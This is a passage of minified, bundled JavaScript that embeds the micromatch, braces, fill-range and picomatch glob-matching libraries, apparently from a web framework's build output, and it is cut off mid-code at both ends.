	return normalizeTrailingSlash.exports;
}

var matchRemotePattern = {};

var micromatch = {exports: {}};

var hasRequiredMicromatch;

function requireMicromatch () {
	if (hasRequiredMicromatch) return micromatch.exports;
	hasRequiredMicromatch = 1;
	(()=>{var e={333:(e,t,r)=>{const n=r(137);const u=r(179);const s=r(13);const o=r(719);const braces=(e,t={})=>{let r=[];if(Array.isArray(e)){for(let n of e){let e=braces.create(n,t);if(Array.isArray(e)){r.push(...e);}else {r.push(e);}}}else {r=[].concat(braces.create(e,t));}if(t&&t.expand===true&&t.nodupes===true){r=[...new Set(r)];}return r};braces.parse=(e,t={})=>o(e,t);braces.stringify=(e,t={})=>{if(typeof e==="string"){return n(braces.parse(e,t),t)}return n(e,t)};braces.compile=(e,t={})=>{if(typeof e==="string"){e=braces.parse(e,t);}return u(e,t)};braces.expand=(e,t={})=>{if(typeof e==="string"){e=braces.parse(e,t);}let r=s(e,t);if(t.noempty===true){r=r.filter(Boolean);}if(t.nodupes===true){r=[...new Set(r)];}return r};braces.create=(e,t={})=>{if(e===""||e.length<3){return [e]}return t.expand!==true?braces.compile(e,t):braces.expand(e,t)};e.exports=braces;},179:(e,t,r)=>{const n=r(783);const u=r(617);const compile=(e,t={})=>{let walk=(e,r={})=>{let s=u.isInvalidBrace(r);let o=e.invalid===true&&t.escapeInvalid===true;let i=s===true||o===true;let a=t.escapeInvalid===true?"\\":"";let l="";if(e.isOpen===true){return a+e.value}if(e.isClose===true){return a+e.value}if(e.type==="open"){return i?a+e.value:"("}if(e.type==="close"){return i?a+e.value:")"}if(e.type==="comma"){return e.prev.type==="comma"?"":i?e.value:"|"}if(e.value){return e.value}if(e.nodes&&e.ranges>0){let r=u.reduce(e.nodes);let s=n(...r,{...t,wrap:false,toRegex:true});if(s.length!==0){return r.length>1&&s.length>1?`(${s})`:s}}if(e.nodes){for(let t of e.nodes){l+=walk(t,e);}}return l};return walk(e)};e.exports=compile;},457:e=>{e.exports={MAX_LENGTH:1024*64,CHAR_0:"0",CHAR_9:"9",CHAR_UPPERCASE_A:"A",CHAR_LOWERCASE_A:"a",CHAR_UPPERCASE_Z:"Z",CHAR_LOWERCASE_Z:"z",CHAR_LEFT_PARENTHESES:"(",CHAR_RIGHT_PARENTHESES:")",CHAR_ASTERISK:"*",CHAR_AMPERSAND:"&",CHAR_AT:"@",CHAR_BACKSLASH:"\\",CHAR_BACKTICK:"`",CHAR_CARRIAGE_RETURN:"\r",CHAR_CIRCUMFLEX_ACCENT:"^",CHAR_COLON:":",CHAR_COMMA:",",CHAR_DOLLAR:"$",CHAR_DOT:".",CHAR_DOUBLE_QUOTE:'"',CHAR_EQUAL:"=",CHAR_EXCLAMATION_MARK:"!",CHAR_FORM_FEED:"\f",CHAR_FORWARD_SLASH:"/",CHAR_HASH:"#",CHAR_HYPHEN_MINUS:"-",CHAR_LEFT_ANGLE_BRACKET:"<",CHAR_LEFT_CURLY_BRACE:"{",CHAR_LEFT_SQUARE_BRACKET:"[",CHAR_LINE_FEED:"\n",CHAR_NO_BREAK_SPACE:" ",CHAR_PERCENT:"%",CHAR_PLUS:"+",CHAR_QUESTION_MARK:"?",CHAR_RIGHT_ANGLE_BRACKET:">",CHAR_RIGHT_CURLY_BRACE:"}",CHAR_RIGHT_SQUARE_BRACKET:"]",CHAR_SEMICOLON:";",CHAR_SINGLE_QUOTE:"'",CHAR_SPACE:" ",CHAR_TAB:"\t",CHAR_UNDERSCORE:"_",CHAR_VERTICAL_LINE:"|",CHAR_ZERO_WIDTH_NOBREAK_SPACE:"\ufeff"};},13:(e,t,r)=>{const n=r(783);const u=r(137);const s=r(617);const append=(e="",t="",r=false)=>{let n=[];e=[].concat(e);t=[].concat(t);if(!t.length)return e;if(!e.length){return r?s.flatten(t).map((e=>`{${e}}`)):t}for(let u of e){if(Array.isArray(u)){for(let e of u){n.push(append(e,t,r));}}else {for(let e of t){if(r===true&&typeof e==="string")e=`{${e}}`;n.push(Array.isArray(e)?append(u,e,r):u+e);}}}return s.flatten(n)};const expand=(e,t={})=>{let r=t.rangeLimit===void 0?1e3:t.rangeLimit;let walk=(e,o={})=>{e.queue=[];let i=o;let a=o.queue;while(i.type!=="brace"&&i.type!=="root"&&i.parent){i=i.parent;a=i.queue;}if(e.invalid||e.dollar){a.push(append(a.pop(),u(e,t)));return}if(e.type==="brace"&&e.invalid!==true&&e.nodes.length===2){a.push(append(a.pop(),["{}"]));return}if(e.nodes&&e.ranges>0){let o=s.reduce(e.nodes);if(s.exceedsLimit(...o,t.step,r)){throw new RangeError("expanded array length exceeds range limit. Use options.rangeLimit to increase or disable the limit.")}let i=n(...o,t);if(i.length===0){i=u(e,t);}a.push(append(a.pop(),i));e.nodes=[];return}let l=s.encloseBrace(e);let c=e.queue;let p=e;while(p.type!=="brace"&&p.type!=="root"&&p.parent){p=p.parent;c=p.queue;}for(let t=0;t<e.nodes.length;t++){let r=e.nodes[t];if(r.type==="comma"&&e.type==="brace"){if(t===1)c.push("");c.push("");continue}if(r.type==="close"){a.push(append(a.pop(),c,l));continue}if(r.value&&r.type!=="open"){c.push(append(c.pop(),r.value));continue}if(r.nodes){walk(r,e);}}return c};return s.flatten(walk(e))};e.exports=expand;},719:(e,t,r)=>{const n=r(137);const{MAX_LENGTH:u,CHAR_BACKSLASH:s,CHAR_BACKTICK:o,CHAR_COMMA:i,CHAR_DOT:a,CHAR_LEFT_PARENTHESES:l,CHAR_RIGHT_PARENTHESES:c,CHAR_LEFT_CURLY_BRACE:p,CHAR_RIGHT_CURLY_BRACE:f,CHAR_LEFT_SQUARE_BRACKET:A,CHAR_RIGHT_SQUARE_BRACKET:R,CHAR_DOUBLE_QUOTE:_,CHAR_SINGLE_QUOTE:h,CHAR_NO_BREAK_SPACE:g,CHAR_ZERO_WIDTH_NOBREAK_SPACE:E}=r(457);const parse=(e,t={})=>{if(typeof e!=="string"){throw new TypeError("Expected a string")}let r=t||{};let C=typeof r.maxLength==="number"?Math.min(u,r.maxLength):u;if(e.length>C){throw new SyntaxError(`Input length (${e.length}), exceeds max characters (${C})`)}let y={type:"root",input:e,nodes:[]};let d=[y];let x=y;let b=y;let S=0;let H=e.length;let v=0;let $=0;let m;const advance=()=>e[v++];const push=e=>{if(e.type==="text"&&b.type==="dot"){b.type="text";}if(b&&b.type==="text"&&e.type==="text"){b.value+=e.value;return}x.nodes.push(e);e.parent=x;e.prev=b;b=e;return e};push({type:"bos"});while(v<H){x=d[d.length-1];m=advance();if(m===E||m===g){continue}if(m===s){push({type:"text",value:(t.keepEscaping?m:"")+advance()});continue}if(m===R){push({type:"text",value:"\\"+m});continue}if(m===A){S++;let t;while(v<H&&(t=advance())){m+=t;if(t===A){S++;continue}if(t===s){m+=advance();continue}if(t===R){S--;if(S===0){break}}}push({type:"text",value:m});continue}if(m===l){x=push({type:"paren",nodes:[]});d.push(x);push({type:"text",value:m});continue}if(m===c){if(x.type!=="paren"){push({type:"text",value:m});continue}x=d.pop();push({type:"text",value:m});x=d[d.length-1];continue}if(m===_||m===h||m===o){let e=m;let r;if(t.keepQuotes!==true){m="";}while(v<H&&(r=advance())){if(r===s){m+=r+advance();continue}if(r===e){if(t.keepQuotes===true)m+=r;break}m+=r;}push({type:"text",value:m});continue}if(m===p){$++;let e=b.value&&b.value.slice(-1)==="$"||x.dollar===true;let t={type:"brace",open:true,close:false,dollar:e,depth:$,commas:0,ranges:0,nodes:[]};x=push(t);d.push(x);push({type:"open",value:m});continue}if(m===f){if(x.type!=="brace"){push({type:"text",value:m});continue}let e="close";x=d.pop();x.close=true;push({type:e,value:m});$--;x=d[d.length-1];continue}if(m===i&&$>0){if(x.ranges>0){x.ranges=0;let e=x.nodes.shift();x.nodes=[e,{type:"text",value:n(x)}];}push({type:"comma",value:m});x.commas++;continue}if(m===a&&$>0&&x.commas===0){let e=x.nodes;if($===0||e.length===0){push({type:"text",value:m});continue}if(b.type==="dot"){x.range=[];b.value+=m;b.type="range";if(x.nodes.length!==3&&x.nodes.length!==5){x.invalid=true;x.ranges=0;b.type="text";continue}x.ranges++;x.args=[];continue}if(b.type==="range"){e.pop();let t=e[e.length-1];t.value+=b.value+m;b=t;x.ranges--;continue}push({type:"dot",value:m});continue}push({type:"text",value:m});}do{x=d.pop();if(x.type!=="root"){x.nodes.forEach((e=>{if(!e.nodes){if(e.type==="open")e.isOpen=true;if(e.type==="close")e.isClose=true;if(!e.nodes)e.type="text";e.invalid=true;}}));let e=d[d.length-1];let t=e.nodes.indexOf(x);e.nodes.splice(t,1,...x.nodes);}}while(d.length>0);push({type:"eos"});return y};e.exports=parse;},137:(e,t,r)=>{const n=r(617);e.exports=(e,t={})=>{let stringify=(e,r={})=>{let u=t.escapeInvalid&&n.isInvalidBrace(r);let s=e.invalid===true&&t.escapeInvalid===true;let o="";if(e.value){if((u||s)&&n.isOpenOrClose(e)){return "\\"+e.value}return e.value}if(e.value){return e.value}if(e.nodes){for(let t of e.nodes){o+=stringify(t);}}return o};return stringify(e)};},617:(e,t)=>{t.isInteger=e=>{if(typeof e==="number"){return Number.isInteger(e)}if(typeof e==="string"&&e.trim()!==""){return Number.isInteger(Number(e))}return false};t.find=(e,t)=>e.nodes.find((e=>e.type===t));t.exceedsLimit=(e,r,n=1,u)=>{if(u===false)return false;if(!t.isInteger(e)||!t.isInteger(r))return false;return (Number(r)-Number(e))/Number(n)>=u};t.escapeNode=(e,t=0,r)=>{let n=e.nodes[t];if(!n)return;if(r&&n.type===r||n.type==="open"||n.type==="close"){if(n.escaped!==true){n.value="\\"+n.value;n.escaped=true;}}};t.encloseBrace=e=>{if(e.type!=="brace")return false;if(e.commas>>0+e.ranges>>0===0){e.invalid=true;return true}return false};t.isInvalidBrace=e=>{if(e.type!=="brace")return false;if(e.invalid===true||e.dollar)return true;if(e.commas>>0+e.ranges>>0===0){e.invalid=true;return true}if(e.open!==true||e.close!==true){e.invalid=true;return true}return false};t.isOpenOrClose=e=>{if(e.type==="open"||e.type==="close"){return true}return e.open===true||e.close===true};t.reduce=e=>e.reduce(((e,t)=>{if(t.type==="text")e.push(t.value);if(t.type==="range")t.type="text";return e}),[]);t.flatten=(...e)=>{const t=[];const flat=e=>{for(let r=0;r<e.length;r++){let n=e[r];Array.isArray(n)?flat(n):n!==void 0&&t.push(n);}return t};flat(e);return t};},783:(e,t,r)=>{
	/*!
	 * fill-range <https://github.com/jonschlinkert/fill-range>
	 *
	 * Copyright (c) 2014-present, Jon Schlinkert.
	 * Licensed under the MIT License.
	 */
	const n=r(837);const u=r(492);const isObject=e=>e!==null&&typeof e==="object"&&!Array.isArray(e);const transform=e=>t=>e===true?Number(t):String(t);const isValidValue=e=>typeof e==="number"||typeof e==="string"&&e!=="";const isNumber=e=>Number.isInteger(+e);const zeros=e=>{let t=`${e}`;let r=-1;if(t[0]==="-")t=t.slice(1);if(t==="0")return false;while(t[++r]==="0");return r>0};const stringify=(e,t,r)=>{if(typeof e==="string"||typeof t==="string"){return true}return r.stringify===true};const pad=(e,t,r)=>{if(t>0){let r=e[0]==="-"?"-":"";if(r)e=e.slice(1);e=r+e.padStart(r?t-1:t,"0");}if(r===false){return String(e)}return e};const toMaxLen=(e,t)=>{let r=e[0]==="-"?"-":"";if(r){e=e.slice(1);t--;}while(e.length<t)e="0"+e;return r?"-"+e:e};const toSequence=(e,t)=>{e.negatives.sort(((e,t)=>e<t?-1:e>t?1:0));e.positives.sort(((e,t)=>e<t?-1:e>t?1:0));let r=t.capture?"":"?:";let n="";let u="";let s;if(e.positives.length){n=e.positives.join("|");}if(e.negatives.length){u=`-(${r}${e.negatives.join("|")})`;}if(n&&u){s=`${n}|${u}`;}else {s=n||u;}if(t.wrap){return `(${r}${s})`}return s};const toRange=(e,t,r,n)=>{if(r){return u(e,t,{wrap:false,...n})}let s=String.fromCharCode(e);if(e===t)return s;let o=String.fromCharCode(t);return `[${s}-${o}]`};const toRegex=(e,t,r)=>{if(Array.isArray(e)){let t=r.wrap===true;let n=r.capture?"":"?:";return t?`(${n}${e.join("|")})`:e.join("|")}return u(e,t,r)};const rangeError=(...e)=>new RangeError("Invalid range arguments: "+n.inspect(...e));const invalidRange=(e,t,r)=>{if(r.strictRanges===true)throw rangeError([e,t]);return []};const invalidStep=(e,t)=>{if(t.strictRanges===true){throw new TypeError(`Expected step "${e}" to be a number`)}return []};const fillNumbers=(e,t,r=1,n={})=>{let u=Number(e);let s=Number(t);if(!Number.isInteger(u)||!Number.isInteger(s)){if(n.strictRanges===true)throw rangeError([e,t]);return []}if(u===0)u=0;if(s===0)s=0;let o=u>s;let i=String(e);let a=String(t);let l=String(r);r=Math.max(Math.abs(r),1);let c=zeros(i)||zeros(a)||zeros(l);let p=c?Math.max(i.length,a.length,l.length):0;let f=c===false&&stringify(e,t,n)===false;let A=n.transform||transform(f);if(n.toRegex&&r===1){return toRange(toMaxLen(e,p),toMaxLen(t,p),true,n)}let R={negatives:[],positives:[]};let push=e=>R[e<0?"negatives":"positives"].push(Math.abs(e));let _=[];let h=0;while(o?u>=s:u<=s){if(n.toRegex===true&&r>1){push(u);}else {_.push(pad(A(u,h),p,f));}u=o?u-r:u+r;h++;}if(n.toRegex===true){return r>1?toSequence(R,n):toRegex(_,null,{wrap:false,...n})}return _};const fillLetters=(e,t,r=1,n={})=>{if(!isNumber(e)&&e.length>1||!isNumber(t)&&t.length>1){return invalidRange(e,t,n)}let u=n.transform||(e=>String.fromCharCode(e));let s=`${e}`.charCodeAt(0);let o=`${t}`.charCodeAt(0);let i=s>o;let a=Math.min(s,o);let l=Math.max(s,o);if(n.toRegex&&r===1){return toRange(a,l,false,n)}let c=[];let p=0;while(i?s>=o:s<=o){c.push(u(s,p));s=i?s-r:s+r;p++;}if(n.toRegex===true){return toRegex(c,null,{wrap:false,options:n})}return c};const fill=(e,t,r,n={})=>{if(t==null&&isValidValue(e)){return [e]}if(!isValidValue(e)||!isValidValue(t)){return invalidRange(e,t,n)}if(typeof r==="function"){return fill(e,t,1,{transform:r})}if(isObject(r)){return fill(e,t,0,r)}let u={...n};if(u.capture===true)u.wrap=true;r=r||u.step||1;if(!isNumber(r)){if(r!=null&&!isObject(r))return invalidStep(r,u);return fill(e,t,1,r)}if(isNumber(e)&&isNumber(t)){return fillNumbers(e,t,r,u)}return fillLetters(e,t,Math.max(Math.abs(r),1),u)};e.exports=fill;},357:e=>{
	/*!
	 * is-number <https://github.com/jonschlinkert/is-number>
	 *
	 * Copyright (c) 2014-present, Jon Schlinkert.
	 * Released under the MIT License.
	 */
	e.exports=function(e){if(typeof e==="number"){return e-e===0}if(typeof e==="string"&&e.trim()!==""){return Number.isFinite?Number.isFinite(+e):isFinite(+e)}return false};},971:(e,t,r)=>{const n=r(837);const u=r(333);const s=r(251);const o=r(513);const isEmptyString=e=>e===""||e==="./";const micromatch=(e,t,r)=>{t=[].concat(t);e=[].concat(e);let n=new Set;let u=new Set;let o=new Set;let i=0;let onResult=e=>{o.add(e.output);if(r&&r.onResult){r.onResult(e);}};for(let o=0;o<t.length;o++){let a=s(String(t[o]),{...r,onResult:onResult},true);let l=a.state.negated||a.state.negatedExtglob;if(l)i++;for(let t of e){let e=a(t,true);let r=l?!e.isMatch:e.isMatch;if(!r)continue;if(l){n.add(e.output);}else {n.delete(e.output);u.add(e.output);}}}let a=i===t.length?[...o]:[...u];let l=a.filter((e=>!n.has(e)));if(r&&l.length===0){if(r.failglob===true){throw new Error(`No matches found for "${t.join(", ")}"`)}if(r.nonull===true||r.nullglob===true){return r.unescape?t.map((e=>e.replace(/\\/g,""))):t}}return l};micromatch.match=micromatch;micromatch.matcher=(e,t)=>s(e,t);micromatch.isMatch=(e,t,r)=>s(t,r)(e);micromatch.any=micromatch.isMatch;micromatch.not=(e,t,r={})=>{t=[].concat(t).map(String);let n=new Set;let u=[];let onResult=e=>{if(r.onResult)r.onResult(e);u.push(e.output);};let s=micromatch(e,t,{...r,onResult:onResult});for(let e of u){if(!s.includes(e)){n.add(e);}}return [...n]};micromatch.contains=(e,t,r)=>{if(typeof e!=="string"){throw new TypeError(`Expected a string: "${n.inspect(e)}"`)}if(Array.isArray(t)){return t.some((t=>micromatch.contains(e,t,r)))}if(typeof t==="string"){if(isEmptyString(e)||isEmptyString(t)){return false}if(e.includes(t)||e.startsWith("./")&&e.slice(2).includes(t)){return true}}return micromatch.isMatch(e,t,{...r,contains:true})};micromatch.matchKeys=(e,t,r)=>{if(!o.isObject(e)){throw new TypeError("Expected the first argument to be an object")}let n=micromatch(Object.keys(e),t,r);let u={};for(let t of n)u[t]=e[t];return u};micromatch.some=(e,t,r)=>{let n=[].concat(e);for(let e of [].concat(t)){let t=s(String(e),r);if(n.some((e=>t(e)))){return true}}return false};micromatch.every=(e,t,r)=>{let n=[].concat(e);for(let e of [].concat(t)){let t=s(String(e),r);if(!n.every((e=>t(e)))){return false}}return true};micromatch.all=(e,t,r)=>{if(typeof e!=="string"){throw new TypeError(`Expected a string: "${n.inspect(e)}"`)}return [].concat(t).every((t=>s(t,r)(e)))};micromatch.capture=(e,t,r)=>{let n=o.isWindows(r);let u=s.makeRe(String(e),{...r,capture:true});let i=u.exec(n?o.toPosixSlashes(t):t);if(i){return i.slice(1).map((e=>e===void 0?"":e))}};micromatch.makeRe=(...e)=>s.makeRe(...e);micromatch.scan=(...e)=>s.scan(...e);micromatch.parse=(e,t)=>{let r=[];for(let n of [].concat(e||[])){for(let e of u(String(n),t)){r.push(s.parse(e,t));}}return r};micromatch.braces=(e,t)=>{if(typeof e!=="string")throw new TypeError("Expected a string");if(t&&t.nobrace===true||!/\{.*\}/.test(e)){return [e]}return u(e,t)};micromatch.braceExpand=(e,t)=>{if(typeof e!=="string")throw new TypeError("Expected a string");return micromatch.braces(e,{...t,expand:true})};e.exports=micromatch;},251:(e,t,r)=>{e.exports=r(683);},356:(e,t,r)=>{const n=r(17);const u="\\\\/";const s=`[^${u}]`;const o="\\.";const i="\\+";const a="\\?";const l="\\/";const c="(?=.)";const p="[^/]";const f=`(?:${l}|$)`;const A=`(?:^|${l})`;const R=`${o}{1,2}${f}`;const _=`(?!${o})`;const h=`(?!${A}${R})`;const g=`(?!${o}{0,1}${f})`;const E=`(?!${R})`;const C=`[^.${l}]`;const y=`${p}*?`;const d={DOT_LITERAL:o,PLUS_LITERAL:i,QMARK_LITERAL:a,SLASH_LITERAL:l,ONE_CHAR:c,QMARK:p,END_ANCHOR:f,DOTS_SLASH:R,NO_DOT:_,NO_DOTS:h,NO_DOT_SLASH:g,NO_DOTS_SLASH:E,QMARK_NO_DOT:C,STAR:y,START_ANCHOR:A};const x={...d,SLASH_LITERAL:`[${u}]`,QMARK:s,STAR:`${s}*?`,DOTS_SLASH:`${o}{1,2}(?:[${u}]|$)`,NO_DOT:`(?!${o})`,NO_DOTS:`(?!(?:^|[${u}])${o}{1,2}(?:[${u}]|$))`,NO_DOT_SLASH:`(?!${o}{0,1}(?:[${u}]|$))`,NO_DOTS_SLASH:`(?!${o}{1,2}(?:[${u}]|$))`,QMARK_NO_DOT:`[^.${u}]`,START_ANCHOR:`(?:^|[${u}])`,END_ANCHOR:`(?:[${u}]|$)`};const b={alnum:"a-zA-Z0-9",alpha:"a-zA-Z",ascii:"\\x00-\\x7F",blank:" \\t",cntrl:"\\x00-\\x1F\\x7F",digit:"0-9",graph:"\\x21-\\x7E",lower:"a-z",print:"\\x20-\\x7E ",punct:"\\-!\"#$%&'()\\*+,./:;<=>?@[\\]^_`{|}~",space:" \\t\\r\\n\\v\\f",upper:"A-Z",word:"A-Za-z0-9_",xdigit:"A-Fa-f0-9"};e.exports={MAX_LENGTH:1024*64,POSIX_REGEX_SOURCE:b,REGEX_BACKSLASH:/\\(?![*+?^${}(|)[\]])/g,REGEX_NON_SPECIAL_CHARS:/^[^@![\].,$*+?^{}()|\\/]+/,REGEX_SPECIAL_CHARS:/[-*+?.^${}(|)[\]]/,REGEX_SPECIAL_CHARS_BACKREF:/(\\?)((\W)(\3*))/g,REGEX_SPECIAL_CHARS_GLOBAL:/([-*+?.^${}(|)[\]])/g,REGEX_REMOVE_BACKSLASH:/(?:\[.*?[^\\]\]|\\(?=.))/g,REPLACEMENTS:{"***":"*","**/**":"**","**/**/**":"**"},CHAR_0:48,CHAR_9:57,CHAR_UPPERCASE_A:65,CHAR_LOWERCASE_A:97,CHAR_UPPERCASE_Z:90,CHAR_LOWERCASE_Z:122,CHAR_LEFT_PARENTHESES:40,CHAR_RIGHT_PARENTHESES:41,CHAR_ASTERISK:42,CHAR_AMPERSAND:38,CHAR_AT:64,CHAR_BACKWARD_SLASH:92,CHAR_CARRIAGE_RETURN:13,CHAR_CIRCUMFLEX_ACCENT:94,CHAR_COLON:58,CHAR_COMMA:44,CHAR_DOT:46,CHAR_DOUBLE_QUOTE:34,CHAR_EQUAL:61,CHAR_EXCLAMATION_MARK:33,CHAR_FORM_FEED:12,CHAR_FORWARD_SLASH:47,CHAR_GRAVE_ACCENT:96,CHAR_HASH:35,CHAR_HYPHEN_MINUS:45,CHAR_LEFT_ANGLE_BRACKET:60,CHAR_LEFT_CURLY_BRACE:123,CHAR_LEFT_SQUARE_BRACKET:91,CHAR_LINE_FEED:10,CHAR_NO_BREAK_SPACE:160,CHAR_PERCENT:37,CHAR_PLUS:43,CHAR_QUESTION_MARK:63,CHAR_RIGHT_ANGLE_BRACKET:62,CHAR_RIGHT_CURLY_BRACE:125,CHAR_RIGHT_SQUARE_BRACKET:93,CHAR_SEMICOLON:59,CHAR_SINGLE_QUOTE:39,CHAR_SPACE:32,CHAR_TAB:9,CHAR_UNDERSCORE:95,CHAR_VERTICAL_LINE:124,CHAR_ZERO_WIDTH_NOBREAK_SPACE:65279,SEP:n.sep,extglobChars(e){return {"!":{type:"negate",open:"(?:(?!(?:",close:`))${e.STAR})`},"?":{type:"qmark",open:"(?:",close:")?"},"+":{type:"plus",open:"(?:",close:")+"},"*":{type:"star",open:"(?:",close:")*"},"@":{type:"at",open:"(?:",close:")"}}},globChars(e){return e===true?x:d}};},754:(e,t,r)=>{const n=r(356);const u=r(513);const{MAX_LENGTH:s,POSIX_REGEX_SOURCE:o,REGEX_NON_SPECIAL_CHARS:i,REGEX_SPECIAL_CHARS_BACKREF:a,REPLACEMENTS:l}=n;const expandRange=(e,t)=>{if(typeof t.expandRange==="function"){return t.expandRange(...e,t)}e.sort();const r=`[${e.join("-")}]`;try{new RegExp(r);}catch(t){return e.map((e=>u.escapeRegex(e))).join("..")}return r};const syntaxError=(e,t)=>`Missing ${e}: "${t}" - use "\\\\${t}" to match literal characters`;const parse=(e,t)=>{if(typeof e!=="string"){throw new TypeError("Expected a string")}e=l[e]||e;const r={...t};const c=typeof r.maxLength==="number"?Math.min(s,r.maxLength):s;let p=e.length;if(p>c){throw new SyntaxError(`Input length: ${p}, exceeds maximum allowed length: ${c}`)}const f={type:"bos",value:"",output:r.prepend||""};const A=[f];const R=r.capture?"":"?:";const _=u.isWindows(t);const h=n.globChars(_);const g=n.extglobChars(h);const{DOT_LITERAL:E,PLUS_LITERAL:C,SLASH_LITERAL:y,ONE_CHAR:d,DOTS_SLASH:x,NO_DOT:b,NO_DOT_SLASH:S,NO_DOTS_SLASH:H,QMARK:v,QMARK_NO_DOT:$,STAR:m,START_ANCHOR:T}=h;const globstar=e=>`(${R}(?:(?!${T}${e.dot?x:E}).)*?)`;const L=r.dot?"":b;const O=r.dot?v:$;let w=r.bash===true?globstar(r):m;if(r.capture){w=`(${w})`;}if(typeof r.noext==="boolean"){r.noextglob=r.noext;}const N={input:e,index:-1,start:0,dot:r.dot===true,consumed:"",output:"",prefix:"",backtrack:false,negated:false,brackets:0,braces:0,parens:0,quotes:0,globstar:false,tokens:A};e=u.removePrefix(e,N);p=e.length;const k=[];const I=[];const M=[];let P=f;let B;const eos=()=>N.index===p-1;const G=N.peek=(t=1)=>e[N.index+t];const D=N.advance=()=>e[++N.index];const remaining=()=>e.slice(N.index+1);const consume=(e="",t=0)=>{N.consumed+=e;N.index+=t;};const append=e=>{N.output+=e.output!=null?e.output:e.value;consume(e.value);};const negate=()=>{let e=1;while(G()==="!"&&(G(2)!=="("||G(3)==="?")){D();N.start++;e++;}if(e%2===0){return false}N.negated=true;N.start++;return true};const increment=e=>{N[e]++;M.push(e);};const decrement=e=>{N[e]--;M.pop();};const push=e=>{if(P.type==="globstar"){const t=N.braces>0&&(e.type==="comma"||e.type==="brace");const r=e.extglob===true||k.length&&(e.type==="pipe"||e.type==="paren");if(e.type!=="slash"&&e.type!=="paren"&&!t&&!r){N.output=N.output.slice(0,-P.output.length);P.type="star";P.value="*";P.output=w;N.output+=P.output;}}if(k.length&&e.type!=="paren"&&!g[e.value]){k[k.length-1].inner+=e.value;}if(e.value||e.output)append(e);if(P&&P.type==="text"&&e.type==="text"){P.value+=e.value;P.output=(P.output||"")+e.value;return}e.prev=P;A.push(e);P=e;};const extglobOpen=(e,t)=>{const n={...g[t],conditions:1,inner:""};n.prev=P;n.parens=N.parens;n.output=N.output;const u=(r.capture?"(":"")+n.open;increment("parens");push({type:e,value:t,output:N.output?"":d});push({type:"paren",extglob:true,value:D(),output:u});k.push(n);};const extglobClose=e=>{let t=e.close+(r.capture?")":"");if(e.type==="negate"){let n=w;if(e.inner&&e.inner.length>1&&e.inner.includes("/")){n=globstar(r);}if(n!==w||eos()||/^\)+$/.test(remaining())){t=e.close=`)$))${n}`;}if(e.prev.type==="bos"){N.negatedExtglob=true;}}push({type:"paren",extglob:true,value:B,output:t});decrement("parens");};if(r.fastpaths!==false&&!/(^[*!]|[/()[\]{}"])/.test(e)){let n=false;let s=e.replace(a,((e,t,r,u,s,o)=>{if(u==="\\"){n=true;return e}if(u==="?"){if(t){return t+u+(s?v.repeat(s.length):"")}if(o===0){return O+(s?v.repeat(s.length):"")}return v.repeat(r.length)}if(u==="."){return E.repeat(r.length)}if(u==="*"){if(t){return t+u+(s?w:"")}return w}return t?e:`\\${e}`}));if(n===true){if(r.unescape===true){s=s.replace(/\\/g,"");}else {s=s.replace(/\\+/g,(e=>e.length%2===0?"\\\\":e?"\\":""));}}if(s===e&&r.contains===true){N.output=e;return N}N.output=u.wrapOutput(s,N,t);return N}while(!eos()){B=D();if(B==="\0"){continue}if(B==="\\"){const e=G();if(e==="/"&&r.bash!==true){continue}if(e==="."||e===";"){continue}if(!e){B+="\\";push({type:"text",value:B});continue}const t=/^\\+/.exec(remaining());let n=0;if(t&&t[0].length>2){n=t[0].length;N.index+=n;if(n%2!==0){B+="\\";}}if(r.unescape===true){B=D()||"";}else {B+=D()||"";}if(N.brackets===0){push({type:"text",value:B});continue}}if(N.brackets>0&&(B!=="]"||P.value==="["||P.value==="[^")){if(r.posix!==false&&B===":"){const e=P.value.slice(1);if(e.includes("[")){P.posix=true;if(e.includes(":")){const e=P.value.lastIndexOf("[");const t=P.value.slice(0,e);const r=P.value.slice(e+2);const n=o[r];if(n){P.value=t+n;N.backtrack=true;D();if(!f.output&&A.indexOf(P)===1){f.output=d;}continue}}}}if(B==="["&&G()!==":"||B==="-"&&G()==="]"){B=`\\${B}`;}if(B==="]"&&(P.value==="["||P.value==="[^")){B=`\\${B}`;}if(r.posix===true&&B==="!"&&P.value==="["){B="^";}P.value+=B;append({value:B});continue}if(N.quotes===1&&B!=='"'){B=u.escapeRegex(B);P.value+=B;append({value:B});continue}if(B==='"'){N.quotes=N.quotes===1?0:1;if(r.keepQuotes===true){push({type:"text",value:B});}continue}if(B==="("){increment("parens");push({type:"paren",value:B});continue}if(B===")"){if(N.parens===0&&r.strictBrackets===true){throw new SyntaxError(syntaxError("opening","("))}const e=k[k.length-1];if(e&&N.parens===e.parens+1){extglobClose(k.pop());continue}push({type:"paren",value:B,output:N.parens?")":"\\)"});decrement("parens");continue}if(B==="["){if(r.nobracket===true||!remaining().includes("]")){if(r.nobracket!==true&&r.strictBrackets===true){throw new SyntaxError(syntaxError("closing","]"))}B=`\\${B}`;}else {increment("brackets");}push({type:"bracket",value:B});continue}if(B==="]"){if(r.nobracket===true||P&&P.type==="bracket"&&P.value.length===1){push({type:"text",value:B,output:`\\${B}`});continue}if(N.brackets===0){if(r.strictBrackets===true){throw new SyntaxError(syntaxError("opening","["))}push({type:"text",value:B,output:`\\${B}`});continue}decrement("brackets");const e=P.value.slice(1);if(P.posix!==true&&e[0]==="^"&&!e.includes("/")){B=`/${B}`;}P.value+=B;append({value:B});if(r.literalBrackets===false||u.hasRegexChars(e)){continue}const t=u.escapeRegex(P.value);N.output=N.output.slice(0,-P.value.length);if(r.literalBrackets===true){N.output+=t;P.value=t;continue}P.value=`(${R}${t}|${P.value})`;N.output+=P.value;continue}if(B==="{"&&r.nobrace!==true){increment("braces");const e={type:"brace",value:B,output:"(",outputIndex:N.output.length,tokensIndex:N.tokens.length};I.push(e);push(e);continue}if(B==="}"){const e=I[I.length-1];if(r.nobrace===true||!e){push({type:"text",value:B,output:B});continue}let t=")";if(e.dots===true){const e=A.slice();const n=[];for(let t=e.length-1;t>=0;t--){A.pop();if(e[t].type==="brace"){break}if(e[t].type!=="dots"){n.unshift(e[t].value);}}t=expandRange(n,r);N.backtrack=true;}if(e.comma!==true&&e.dots!==true){const r=N.output.slice(0,e.outputIndex);const n=N.tokens.slice(e.tokensIndex);e.value=e.output="\\{";B=t="\\}";N.output=r;for(const e of n){N.output+=e.output||e.value;}}push({type:"brace",value:B,output:t});decrement("braces");I.pop();continue}if(B==="|"){if(k.length>0){k[k.length-1].conditions++;}push({type:"text",value:B});continue}if(B===","){let e=B;const 